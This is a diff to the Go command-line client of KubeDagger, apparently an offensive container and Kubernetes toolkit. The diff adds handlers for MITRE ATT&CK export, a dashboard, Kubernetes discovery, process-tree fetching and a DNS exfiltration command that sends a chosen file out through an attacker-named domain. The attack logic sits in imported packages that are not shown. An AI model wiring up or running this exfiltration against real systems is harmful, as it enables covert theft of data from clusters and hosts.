@@ -24,12 +24,17 @@ import (
 	"github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
 
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dashboard"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dns_exfil"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/docker"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/fs_watch"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/mitre"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/network_discovery"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pipe_prog"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/postgres"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/proctree"
 )
 
 func addFSWatchCmd(cmd *cobra.Command, args []string) error {
@@ -156,6 +161,49 @@ func delPostgresRoleCmd(cmd *cobra.Command, args []string) error {
 		return fmt.Errorf("'role' cannot contain '#': %s", options.Role)
 	}
 	return postgres.SendDelPostgresRoleRequest(options.Target, options.Role)
+}
+
+func mitreExportCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	switch options.MitreFormat {
+	case "json":
+		return mitre.ExportNavigatorJSON(options.Output)
+	case "markdown":
+		return mitre.ExportMarkdown(options.Output)
+	default:
+		return fmt.Errorf("unsupported format: %s (use 'json' or 'markdown')", options.MitreFormat)
+	}
+}
+
+func dashboardCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return dashboard.Run(options.Target, options.RefreshRate)
+}
+
+func k8sDiscoverCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return k8s.Discover(options.K8sNamespace, options.Output)
+}
+
+func dnsExfilCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	if options.ExfilFile == "" {
+		return fmt.Errorf("--file is required")
+	}
+	if options.ExfilDomain == "" {
+		return fmt.Errorf("--domain is required")
+	}
+	return dns_exfil.Exfiltrate(options.ExfilFile, options.ExfilDomain, options.DNSServer)
+}
+
+func procTreeGetCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	entries, err := proctree.FetchProcessTree(options.Target)
+	if err != nil {
+		return err
+	}
+	proctree.PrintTree(entries)
+	return nil
 }
 
 func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
